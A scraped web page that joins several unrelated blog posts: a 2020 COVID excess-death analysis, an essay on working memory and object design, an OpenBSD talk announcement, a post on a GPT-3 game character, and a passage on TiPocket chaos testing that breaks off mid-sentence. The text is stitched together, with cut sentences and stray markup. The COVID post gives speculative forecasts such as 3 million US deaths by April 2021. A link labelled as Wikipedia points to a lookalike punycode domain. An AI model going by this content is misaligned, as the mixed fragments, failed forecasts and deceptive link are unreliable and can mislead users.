<p>It is difficult mid-pandemic with a lack of testing to determine the case <a href="https://newslit.org/updates/case-fatality-rate-vs-mortality-rate/" target="_blank" rel="noopener noreferrer">fatality rate (CFR) or mortality rate</a>, which is typically what is being reported. Unfortunately, we don’t know the infection rate. With that in mind, it’s probably more accurate to track the “increased risk of dying in 2020”.</p>
<p>In other words:</p>
<blockquote><p>How much greater are my risks of dying in 2020 over 2019?</p></blockquote>
<p>Infection rate is included as part of metric, we don’t know the extent. COVID19 penetration is <em>maybe</em> 10% across the U.S. population (studies vary wildly). Regardless, as the year progresses, we are sure this number will increase.</p>
<p>With that in mind, on average all age groups over 25, are seeing roughly 10-15% increased risk of dying in 2020 over 2019 (again, this will likely increase):<a href="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png" alt="" width="750" height="497" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 750px) 100vw, 750px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-deaths-by-age-group-2048x1357.png 2048w"></a>Focusing on <strong>New York</strong>, which appears to have kept decent records &amp; has a decent infection rate – the data looks stark:</p>

<p>In contrast, <strong>Illinois </strong>is seeing less deaths over the norm, particularly in the older age groups :<a href="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png" alt="" width="750" height="497" srcset="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 750px) 100vw, 750px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/IL-deaths-by-age-group-2048x1357.png 2048w"></a>The difference in Illinois appears to be older populations have seen a muted increase in deaths.

<p>It should be noted, <strong>Texas</strong> on the other hand has seen a muted increase in fatalities in all age groups (less than Illinois or New York):<a href="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png" alt="" width="792" height="524" srcset="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-2048x1357.png 2048w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1024x678.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-300x199.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-768x509.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-1536x1017.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/TX-deaths-by-age-group-2048x1357.png 2048w"></a>The largest increase has been in the 25-44 year old age range. It’s probably Texas hasn’t had as much of a proliferation of COVID19 yet and most of the spread has been related to young gathers. Leading to our next section…</p>
<h2><span>COVID19 Spread due to Gatherings</span></h2>
<p>It’s important to acknowledge, that as people gather Coronavirus spreads more easily. Particularly, in <strong>Texas</strong>, <strong>Florida</strong>, <strong>Illinois</strong> and others started to see a rise in fatalities (and infections) following rises in heat (pushing gatherings in doors), protests, and generally opening bars.</p>
<p>Particularly, the rise of deaths in <strong>Texas</strong> coincide directly with the protests (Starting week 22 and rising to the present):</p>

<p><strong>Florida</strong> has seen the same effect, in the exact same time range:</p>

Personally, I suspect heat is the largest factor. People gathered outside to protest or celebrate (July 4th) and ended up congregating inside, without masks. This lead to an increase in spread and fatalities, as moving indoors confines people together, in air conditioning, with minimal mask protection or UV to kill the virus.</p>

<p>Finally, in prior discussions I’ve made predictions. Largely, these predictions came from running simulations (both on my own and available to me). As it stands, I continue to stand by my prior prediction:</p>
<ul>
<li>3 million COVID-19 deaths in the United States is likely (April 1, 2021)</li>
<li>25% [true] unemployment in the United States is likely</li>
<li>15% reduction in GDP is within reason</li>
</ul>
<p>Rerunning prior simulation(s) with some minor adjustments to account for new information (such as mask use) and assuming moderately widespread school reopening(s) (and assuming children spread COVID19).

<p>That’s an estimated 180k to 1.85m dead by October 14th. Personally, for the officially count, I’d err on the side of the lower values, perhaps 250k. However, I suspect deaths will be under counted due to lack of testing, I suspect the real figures will be closer to 500k-800k after analysis, this would more closely matching the findings above (which indicate we are already over 200k).</p>

<p>There are still plenty of unknowns related to COVID19. Only time will well, but we can see most people “checking out” so to speak. It’s important to keep up to date regarding COVID19 (and politics) in general. A disaster is …</p></div></article></div>

	<p><strong>Video</strong>: <a href="https://youtu.be/D8Pb8TvYsCE">Philip reading this essay</a>.</p>
<p>The 1956 paper <em><a href="http://psychclassics.yorku.ca/Miller/">The Magical Number Seven, Plus or Minus
Two</a></em> is the most widely cited paper
in the 126 year history of the journal <em><a href="https://en.wikipedia.org/wiki/Psychological_Review">Psychological
Review</a></em>. The author
<a href="https://en.xn--wikipedia-0pb2714h.org/wiki/George_Armitage_Miller">George A. Miller</a> is
considered one of the founders in the field of cognitive science. His
historic claim is that you can only juggle <strong>between 5 and 9 things</strong> in
your brain at any one time.</p>
<p>To my knowledge, despite some
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4486516/">controversy</a> over
the years, this 7 ± 2 figure has withstood the ongoing
<a href="https://www.nature.com/news/1-500-scientists-lift-the-lid-on-reproducibility-1.19970">reproducibility
crisis</a>
and it appears to capture a deep truth about how our brains actually
function.</p>
<p>Many people are skeptical of the claim because seven sounds like an
absurdly small number, surely if you are doing something complex like
writing software, or planning a wedding for that matter, you are juggling
dozens to hundreds of things? As it turns out you are not. At least not at
once.</p>

<p>In 2005 <strong>Lu Chao</strong> recited <a href="https://www.livescience.com/50134-pi-day-memory-experts.html">67,890
digits</a> of
Pi, a mind-boggling demonstration of a gifted and well-trained mind. Yet
given a series of random single-digit numbers he can on average recall less
the than nine of them, to be exact he’s been measured to have a <a href="https://en.wikipedia.org/wiki/Memory_span#Digit-span">digit

fits perfectly within Miller’s finding. Amazing!</p>
<p>Chao memorizes Pi the same way story tellers once memorized long tales
about <a href="https://en.wikipedia.org/wiki/Gilgamesh">Gilgamesh</a>, yet he can only
juggle a handful of things at one time. I find this actually to be very
comforting, he is not a freak of nature, at least not as freaky as you
first thought.</p>
<p>The illusion we can hold many things in mind is almost identical to the
illusion that our field of view is high resolution everywhere. It’s
incredibly compelling because the instant we wonder <em>what’s over there</em> we
do a quick <a href="https://en.wikipedia.org/wiki/Saccade">saccade</a> and are
immediately rewarded with a high resolution view of exactly <em>what’s over
there</em>. We ask the question and we get an instant answer, so it feels like
the answer was there the whole time.</p>

<p>Thinking in general works very much like vision. This is not surprising
since it’s implemented using the same brain hardware. As we rapidly flit
from idea to idea, from concept to concept, we page in the necessary
details, but at no time do we have more than about nine individual things
in the front of our minds.</p>
<p>How do we navigate a complex world with this seemingly crippling limit on
the size of our working memory? Two of the primary tools that we use are
<a href="https://en.wikipedia.org/wiki/Chunking_(psychology)">chunking</a> and
<a href="https://en.wikipedia.org/wiki/Hierarchy">hierarchy</a>.</p>
<p>When we think of a car we naturally divide the car into a handful of high
level chunks like the <em>engine</em>, the <em>dashboard</em>, the <em>seats</em>, the <em>wheels</em>.
When we mentally zoom into the engine, however, it effortlessly resolves
into more parts: the <em>engine block</em>, the <em>pistons</em>, the <em>spark plugs</em>. And
we can keep zooming in, although how far we can zoom in highly depends on
how much we know about cars and the world in general.</p>
<p>In <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">Object Oriented
Programming</a> one
of the simplest ways to tame complexity is to limit your objects to around
seven <em>attributes</em>. In some languages attributes are called <em>member
variables</em> or <em>fields</em>. Many programmers immediately balk at this
suggestion. Sure, that works for toy examples, but I’m writing serious
software and my objects sometimes need 10, 20 or 50 attributes. You must be
working on easy stuff, they will say. My problems are special, so my code
has to be different.</p>
<p>The biggest trap of software development is that it’s easy, trivial in
fact, to write software that you yourself cannot understand, and in turn no
one else can understand. Even a novice, <em>especially</em> a novice, can in a few
weeks write software that literally no one on the planet can easily think
or reason about. That’s depressing, but also kind of impressive in a way.
With great power comes great responsibility.</p>
<p>Objects which have too many attributes are a major cause of software that’s
too complicated to understand. Some people conclude the problem is Object
Oriented Programming itself. This is not a crazy idea, there are <a href="https://tobeva.com/resources/technical/programming/functional/">other
ways</a> to program, and they do
have advantages, but in my experience most of the flaws attributed to
Object Oriented Programming stem from having done it poorly, and boy is it
easy to do poorly.</p>







<div>
	<p><img src="https://tobeva.com/articles/brain-oriented-programming/complex_hua73d922edef0eeb6c3d75f190e4c0729_39455_350x0_resize_q75_catmullrom.jpg" width="350" height="197"></p><p>
Complexity grows without bound.
</p>
	
</div>
<p>The key thing to realize is a single object with a lot of attributes is
itself <em>not</em> Object Oriented. Instead, it’s a 1970s style <a href="https://en.wikipedia.org/wiki/Structured_programming">Structured
Program</a> in disguise.
The attributes of the object are the <strong>global variables</strong> of the program,
and the object’s methods are the program’s <strong>functions</strong>. Every function
can freely access every global variable which is what causes many of the
problems.</p>
<p>A structured program with more than seven global variables is trouble, and
if many objects in your program are effectively messy structured programs
themselves, you are in serious trouble indeed. At a high level you are
doing Object Oriented Programming, but at a low level you are right back in
the 1970s struggling to deal with one confusing program after the next.</p>
<p>How do we save this sinking ship? We save it by actively and aggressively
keeping the number of attributes per object <strong>at or below seven</strong>. If you
fail to do this you are punting the problem <em>to your future self</em>, a
problem that by definition your future self is going to have a hard time
solving.</p>
<p>Just today I had a <a href="https://www.python.org/">Python</a> class called
<code>PerfEvent</code> with these attributes:</p>
<div><pre><code data-lang="python">        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>
        <span>self</span><span>.</span><span>start_ns</span> <span>=</span> <span>start_ns</span>
        <span>self</span><span>.</span><span>end_ns</span> <span>=</span> <span>end_ns</span>
        <span>self</span><span>.</span><span>category</span> <span>=</span> <span>category</span>
        <span>self</span><span>.</span><span>process_id</span> <span>=</span> <span>process_id</span>
        <span>self</span><span>.</span><span>thread_id</span> <span>=</span> <span>thread_id</span>
        <span>self</span><span>.</span><span>args</span> <span>=</span> <span>kwargs</span>
        <span>self</span><span>.</span><span>phase</span> <span>=</span> <span>phase</span></code></pre></div>
<p>That’s eight attributes, since eight is only one over the limit, should we
wait until the object grows bigger? No, let’s deal with it <em>now</em>. To reduce
the number of attributes we introduce two new classes or structs: <code>Span</code>
and <code>Origin</code>. Each only has two attributes, but now the original object has
been slimmed down to six attributes, all is well again:</p>
<div><pre><code data-lang="python">        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>
        <span>self</span><span>.</span><span>span</span> <span>=</span> <span>Span</span><span>(</span><span>start_ns</span><span>,</span> <span>end_ns</span><span>)</span>
        <span>self</span><span>.</span><span>category</span> <span>=</span> <span>category</span>
        <span>self</span><span>.</span><span>origin</span> <span>=</span> <span>Origin</span><span>(</span><span>process_id</span><span>,</span> <span>thread_id</span><span>)</span>
        <span>self</span><span>.</span><span>args</span> <span>=</span> <span>kwargs</span>
        <span>self</span><span>.</span><span>phase</span> <span>=</span> <span>phase</span></code></pre></div>
<p>Although it’s a minor change, compare the two versions, the improved one
simply <em>looks</em> better, even if you stand far back and squint.</p>
<p>It seems minor, but if you don’t make these types of changes as you go it
will eventually lead to <em>intractable</em> complexity, the type of complexity
that causes projects and companies to fail, the type of complexity that
seduces humans into wasting <a href="https://spectrum.ieee.org/computing/software/why-software-fails">billions of
dollars</a>
every year writing software that does not work.</p>
<p>The benefits of introducing sub-objects goes far beyond just reducing the
number of attributes. While accessing the attributes is slightly more
verbose, I like the sound of <code>self.span.start_ns</code> compared to just
<code>self.start_ns</code>, but more importantly we can now pass <code>Span</code>'s and
<code>Owner</code>'s to functions, slimming down and chunking <em>their</em> argument lists.</p>
<p>We’ve introduced two natural and useful concepts that will pay ongoing
dividends, but even better don’t just think of how your code is today,
think about how it’s going to grow over time. Your single monolithic object
has sprouted two buds. You can now push functionality down into these buds,
and they can grow into branches, which later can sprout buds of their own.</p>
<p>For example we can now give <code>Span</code> a <code>get_duration_ns()</code> method. Again it seems
minor, but writing <code>span.get_duration_ns()</code> is better than writing
<code>span.end_ns - span.start_ns</code> especially if you are going to do that in
many different places.</p>
<p>The real magic though is that the benefits of being disciplined will accrue
like <a href="https://youtu.be/GtaoP0skPWc">compound interest</a> as you convert your
monolithic object into an intricately structured tree which buds and
sprouts and branches organically. You will benefit from this better design
every minute you are working on the software, and the software will benefit
greatly from your improved mood and ability to sustain focus.</p>







<div>
	<p><img src="https://tobeva.com/articles/brain-oriented-programming/featured-tree_hua32c95b5f5eab92597bbc4743b997d98_96289_350x0_resize_q75_catmullrom.jpg" width="350" height="312"></p>
	
</div>
<p>Code, like most human created artifacts, can be beautiful, so there is an
aesthetic pay off here, but the real jackpot is that if you assiduously
tend and groom this tree you will create a software design that slides into
your head with minimal fuss and friction, and slides similarly into the
heads of other people.</p>
<p>It’s no accident that we find natural environments to be more soothing than
the made world, than the concrete jungle. The design of the natural world
tends to be more in harmony with how our brains think about that world.
Game recognizes game.</p>
<p>Over time, you will grow a system that you and others can <strong>understand</strong>,
<strong>maintain</strong>, <strong>debug</strong> and <strong>extend</strong>. When people look at your code years
from now, maybe even in the <a href="https://archiveprogram.github.com/">far
future</a>, they will benefit from your
diligence and hard work. And the punchline is doing all this is not hard.
In fact, it’s <em>much easier</em> to do this work than not to not do it.</p>
<p>It’s easier and more pleasant to work with something that’s well crafted
and simpatico with your thinking. It’s hard and unpleasant to constantly
wrestle with something you don’t understand. Trim, prune and shape your
objects early and often. Your brain will thank you.</p>

</p>


<p>
EDIT:
Because I've gotten a lot more requests for the video than I had
anticipated, I've uploaded the talk publicly to YouTube.
</p>
<p>
I recently gave a talk at work to help introduce OpenBSD to my
colleagues. It's a broad introduction to the fundamentals of security
in OpenBSD, as well as some basic system administration tips and
suggestions anyone coming from a Linux background might find useful.
</p>
<p>
It's roughly split up into four sections; the history of OpenBSD,
what sets it apart from other operating systems, a guided
installation, and the system administration introduction.
</p>
<p>
In the original presentation the guided installation was done
interactively with the participants installing OpenBSD in a VM on
their machines to follow along with the slides.
</p>
<p>
I've tried my best to make it as accessible as possible while still
covering the most important beats. If you find any errors please let
me know so I can correct them, my contact info is on the <a href="https://blog.lambda.cx/about/">about</a> page.
</p>
<p>
I've corrected several small issues with the slides since the
recording. I've replaced the file name <code>/etc/mygateway</code> with <code>/etc/mygate</code>,
replaced the smartquotes with regular quotes, and removed the rebound
program, to name the biggest fixes. These corrections are available at
the slides linked below.

August 14, 2020 | https://blog.writtenrealms.com/gpt3/ | <a href="https://web.archive.org/web/*/https://blog.writtenrealms.com/gpt3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>How Written Realms is using the latest generation of Artificial Intelligence to animate its fictional worlds.</p><div>
<p>We were fortunate enough to receive an invite to the <a href="https://openai.com/blog/openai-api/">OpenAI private beta</a> a few weeks ago, gaining an interface to their <a href="https://arxiv.org/abs/2005.14165">GPT-3</a> engine. Using AI for mob interactions within <a href="https://writtenrealms.com/">Written Realms</a> had been a long term goal of ours for many years, and we jumped at the opportunity to play with it.</p>
<h2 id="howtheopenaiapiworks">How the OpenAI API works</h2>
<p>The OpenAI API provides a 'completion' endpoint (also available as a Python binding) for interacting with the GPT-3 engine.</p>
<p>Given a text prompt, the API attempts to complete the pattern that you gave it. For example if you give it an input of <code>1 2 4 8</code> and request 1 token back, you will get a response of: <code>16</code>. The API understood the pattern to be a doubling function and gave the next result.</p>
<p>It's not limited to math. If you give as input <code>Barking is to dogs as meowing is to</code>, you will get as a result: <code>cats</code>.</p>
<p>Not only is GPT-3 good at reading comprehension, but it also good at tailoring its output to match the style of the input. Consider the following prompt:</p>
<pre><code>Tom went fishing all afternoon. He comes home to his wife at sunset, who asks him a question.

Question: What did you do today?
Answer:
</code></pre>
<p>The API returns <code>I went fishing.</code> </p>
<p>It is possible to get a more creative answer by providing more information in the prompt and turning up the <code>temperature</code> setting, which gives GPT-3 more of a creative license to make stuff up. For example, if after adding <code>Tom responds enthusiastically, providing many details.</code> to the prompt before the question and turning the temperature to its max value, here's how the API responded: </p>
<pre><code>I went fishing all day, and in the afternoon I fought the biggest fish that I have ever seen before. I just held on for as long as I could, because once I gave up there was no way I was getting the fish back again. I had to pull everything I could, and my catch ended up weighing 3 pounds of flounder and 4 pounds of bluegill.
</code></pre>
<p>Evidently, GPT-3 is quite proficient at making stuff up given the right temperature.</p>
<h2 id="howwereusinggpt3">How we're using GPT-3</h2>
<p>For our first foray into GPT-3, we created a Historian NPC (Non-Player Character) who is able to answer arbitrary questions about Edeus, our flagship world. All of our lore is original and it can be challenging to impart it all to the players at once. An AI able to answer the organic questions of a player in real-time seemed like a perfect use-case.</p>
<p>We already had a feature called 'Reactions' that allows NPCs to respond to something said in their room with predetermined commands. The adjustment made here was to add a <code>gpt</code> flag to the Historian which at reaction time forwards the user's input to OpenAI in order to get the response.</p>
<p>As with the fisherman above, we can use the dialog pattern, and precede it with a certain context, which explains to GPT-3 what the background is for the interactions. In this case, we gave it an excerpt from a fictional history book written by the NPC in question, and then provided a little bit of background about the NPC himself. Here is a sample interaction with him:</p>
<pre><code>You say 'hello there'
Grae the Historian says 'Greetings, traveler.'

You say 'Who are you?'
Grae the Historian says 'I am Historian Grae, a Priest of the Church of Thune.'

You say 'Where are we?'
Grae the Historian says 'You are in Bluefinch, a village in the realm of Saphrin.'

You say 'Is there anything I should be doing?'
Grae the Historian says 'You should be killing orcs.'

You say 'Why? What have the orcs ever done to us?'
Grae the Historian says 'The orcs are evil. They want to destroy us.'

You say 'Okay. Can you tell me more about our origin?'
Grae the Historian says 'Humans were created by Thune, the Allmighty God.'

You say 'Who rules this area?'
Grae the Historian says 'The King of Saphrin, Arctus Kerinin, rules this area.'

You say 'Thanks Grae! You've been very helpful'
Grae the Historian says 'You're welcome.'
</code></pre>
<p>If you want to test this out for yourself, Grae is located 3 north, 1 east of Bluefinch Square in Edeus. We're always tweaking his backstory and various settings so his outputs may (and should!) vary a bit.</p>
<h2 id="theknowledgeexclusionlimitation">The Knowledge Exclusion Limitation</h2>
<p>The main issue we've been running up against is that it's difficult to constrain the AI's knowledge to that of a fictional world. It cannot help knowing things about the real world. For example:</p>
<pre><code>You say 'When was JFK born?'
Grae the Historian says 'John Fitzgerald Kennedy was born on May 29, 1917.'
</code></pre>
<p>Ideally, the historian would not know about anything outside of Edeus. But even though we specify in the prompt's backstory that he only answers questions pertaining to his own world, that distinction is not always understood. It's difficult to exclude knowledge.</p>
<h2 id="futureimprovements">Future Improvements</h2>
<p>We plan to keep iterating and try to make the AI feel as human and authentic as possible. One issue is that currently each interaction with the NPC is its own isolated event. For example:</p>
<pre><code>You say 'What is the name of this village?'
Grae the Historian says 'This village is called Bluefinch.'

You say 'Where did it get its name from?'
Grae the Historian says 'Edeus is named after the two titans that fought in the First Age. Thune and Raeshyk.'
</code></pre>
<p>Clearly the NPC didn't connect that the second question was a follow-up from the first. This is because each time we do a call to OpenAI we append the user's query to the end of the same base prompt, making each a separate interaction. It could be improved upon by including a few of the previous back and forths when generating a new prompt, provided it was the same player.</p>
<p>There's also entirely different ways we could leverage GPT-3. For example, it could be used to generate content like room, character and item descriptions, or even dynamic quests. A text-based platform and a text-based AI share great synergy, and the possible applications of it seem endless to the imaginative.</p></div></div>]]>

Although it provides rich capabilities to simulate abnormal system conditions, it still only solves a fraction of the Chaos Engineering puzzle. Besides fault injection, a full chaos engineering application consists of hypothesizing around defined steady states, running experiments in production, validating the system via test cases, and automating the testing.</p><p>This article describes how we use <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">TiPocket</a>, an automated testing framework to build a full Chaos Engineering testing loop for TiDB, our distributed database.</p><h2>Why do we need TiPocket?</h2><p>Before we can put a distributed system like <a href="https://github.com/pingcap/tidb" target="_blank" rel="noopener noreferrer">TiDB</a> into production, we have to ensure that it is robust enough for day-to-day use. For this reason, several years ago we introduced Chaos Engineering into our testing framework. In our testing framework, we:</p><ol><li>Observe the normal metrics and develop our testing hypothesis.</li><li>Inject a list of failures into TiDB.</li><li>Run various test cases to verify TiDB in fault scenarios. </li><li>Monitor and collect test results for analysis and diagnosis.</li></ol><p>This sounds like a solid process, and we’ve used it for years. However, as TiDB evolves, the testing scale multiplies. We have multiple fault scenarios, against which dozens of test cases run in the Kubernetes testing cluster. Even with Chaos Mesh helping to inject failures, the remaining work can still be demanding—not to mention the challenge of automating the pipeline to make the testing scalable and efficient.</p><p>This is why we built TiPocket, a fully-automated testing framework based on Kubernetes and Chaos Mesh. Currently, we mainly use it to test TiDB clusters. However, because of TiPocket’s Kubernetes-friendly design and extensible interface, you can use Kubernetes’ create and delete logic to easily support other applications.</p><h2>How does it work</h2><p>Based on the above requirements, we need an automatic workflow that:</p><ul><li><a href="#injecting-chaos---chaos-mesh">Injects chaos</a></li><li><a href="#verifying-chaos-impacts-test-cases">Verifies the impact of that chaos</a></li><li><a href="#automating-the-chaos-pipeline---argo">Automates the chaos pipeline</a></li><li><a href="#visualizing-the-results-loki">Visualizes the results</a></li></ul><h3>Injecting chaos - Chaos Mesh</h3><p>Fault injection is the core chaos testing. In a distributed database, faults can happen anytime, anywhere—from node crashes, network partitions, and file system failures, to kernel panics. This is where Chaos Mesh comes in.</p><p>Currently, TiPocket supports the following types of fault injection:</p><ul><li><strong>Network</strong>: Simulates network partitions, random packet loss, disorder, duplication, or delay of links.</li><li><strong>Time skew</strong>: Simulates clock skew of the container to be tested.</li><li><strong>Kill</strong>: Kills the specified pod, either randomly in a cluster or within a component (TiDB, TiKV, or Placement Driver (PD)).</li><li><strong>I/O</strong>: Injects I/O delays in TiDB’s storage engine, TiKV,  to identify I/O related issues.</li></ul><p>With fault injection handled, we need to think about verification. How do we make sure TiDB can survive these faults?</p><h2>Verifying chaos impacts: test cases</h2><p>To validate how TiDB withstands chaos, we implemented dozens of test cases in TiPocket, combined with a variety of inspection tools. To give you an overview of how TiPocket verifies TiDB in the event of failures, consider the following test cases. These cases focus on SQL execution, transaction consistency, and transaction isolation.</p><h3>Fuzz testing: SQLsmith</h3><p><a href="https://github.com/pingcap/tipocket/tree/master/pkg/go-sqlsmith" target="_blank" rel="noopener noreferrer">SQLsmith</a> is a tool that generates random SQL queries. TiPocket creates a TiDB cluster and a MySQL instance.. The random SQL generated by SQLsmith is executed on TiDB and MySQL, and various faults are injected into the TiDB cluster to test. In the end, execution results are compared. If we detect inconsistencies, there are potential issues with our system.</p><h3>Transaction consistency testing: Bank and Porcupine</h3><p><a href="https://github.com/pingcap/tipocket/tree/master/cmd/bank" target="_blank" rel="noopener noreferrer">Bank</a> is a classical test case that simulates the transfer process in a banking system. Under snapshot isolation, all transfers must ensure that the total amount of all accounts must be consistent at every moment, even in the face of system failures. If there are inconsistencies in the total amount, there are potential issues with our system.</p><p><a href="https://github.com/anishathalye/porcupine" target="_blank" rel="noopener noreferrer">Porcupine</a> is a linearizability checker in Go built to test the correctness of distributed systems. It takes a sequential specification as executable Go code, along with a concurrent history, and it determines whether the history is linearizable with respect to the sequential specification. In TiPocket, we use the <a href="https://github.com/pingcap/tipocket/tree/master/pkg/check/porcupine" target="_blank" rel="noopener noreferrer">Porcupine</a> checker in multiple test cases to check whether TiDB meets the linearizability constraint.</p><h3>Transaction Isolation testing: Elle</h3><p><a href="https://github.com/jepsen-io/elle" target="_blank" rel="noopener noreferrer">Elle</a> is an inspection tool that verifies a database’s transaction isolation level. TiPocket integrates <a href="https://github.com/pingcap/tipocket/tree/master/pkg/elle" target="_blank" rel="noopener noreferrer">go-elle</a>, the Go implementation of the Elle inspection tool, to verify TiDB’s isolation level.</p><p>These are just a few of the test cases TiPocket uses to verify TiDB’s accuracy and stability. For more test cases and verification methods, see our <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">source code</a>.</p><h2>Automating the chaos pipeline - Argo</h2><p>Now that we have Chaos Mesh to inject faults, a TiDB cluster to test, and ways to validate TiDB, how can we automate the chaos testing pipeline? Two options come to mind: we could implement the scheduling functionality in TiPocket, or hand over the job to existing open-source tools. To make TiPocket more dedicated to the testing part of our workflow, we chose the open-source tools approach. This, plus our all-in-K8s design, lead us directly to <a href="https://github.com/argoproj/argo" target="_blank" rel="noopener noreferrer">Argo</a>.</p><p>Argo is a workflow engine designed for Kubernetes. It has been an open source product for a long time, and has received widespread attention and application.</p><p>Argo has abstracted several custom resource definitions (CRDs) for workflows.  The most important ones include Workflow Template, Workflow, and Cron Workflow. Here is how Argo fits in TiPocket:</p><ul><li><strong>Workflow Template</strong> is a template defined in advance for each test task. Parameters can be passed in when the test is running.</li><li><strong>Workflow</strong> schedules multiple workflow templates in different orders, which form the tasks to be executed. Argo also lets you add conditions, loops, and directed acyclic graphs (DAGs) in the pipeline.</li><li><strong>Cron Workflow</strong> lets you schedule a workflow like a cron job. It is perfectly suitable for scenarios where you want to run test tasks for a long time.</li></ul><p>The sample workflow for our predefined bank test is shown below:</p><div><div><div tabindex="0"><div><p><span>spec</span><span>:</span><span></span></p><p><span>  </span><span>entrypoint</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>  </span><span>arguments</span><span>:</span><span></span></p><p><span>    </span><span>parameters</span><span>:</span><span></span></p><p><span>      </span><span>-</span><span> </span><span>name</span><span>:</span><span> ns</span></p><p><span>        </span><span>value</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p><p><span>            </span><span>-</span><span> </span><span>name</span><span>:</span><span> nemesis</span></p><p><span>        </span><span>value</span><span>:</span><span> random_kill</span><span>,</span><span>kill_pd_leader_5min</span><span>,</span><span>partition_one</span><span>,</span><span>subcritical_skews</span><span>,</span><span>big_skews</span><span>,</span><span>shuffle</span><span>-</span><span>leader</span><span>-</span><span>scheduler</span><span>,</span><span>shuffle</span><span>-</span><span>region</span><span>-</span><span>scheduler</span><span>,</span><span>random</span><span>-</span><span>merge</span><span>-</span><span>scheduler</span></p><p><span>  </span><span>templates</span><span>:</span><span></span></p><p><span>    </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>      </span><span>steps</span><span>:</span><span></span></p><p><span>        </span><span>-</span><span> </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>wait</span><span>-</span><span>cluster</span></p><p><span>            </span><span>templateRef</span><span>:</span><span></span></p><p><span>              </span><span>name</span><span>:</span><span> wait</span><span>-</span><span>cluster</span></p><p><span>              </span><span>template</span><span>:</span><span> wait</span><span>-</span><span>cluster</span></p><p><span>        </span><span>-</span><span> </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>            </span><span>templateRef</span><span>:</span><span></span></p><p><span>              </span><span>name</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p><p><span>              </span><span>template</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p></div></div></div></div><p>In this example, we use the workflow template and nemesis parameters to define the specific failure to inject. You can reuse the template to define multiple workflows that suit different test cases. This allows you to add more customized failure injections in the flow.</p><p>Besides <a 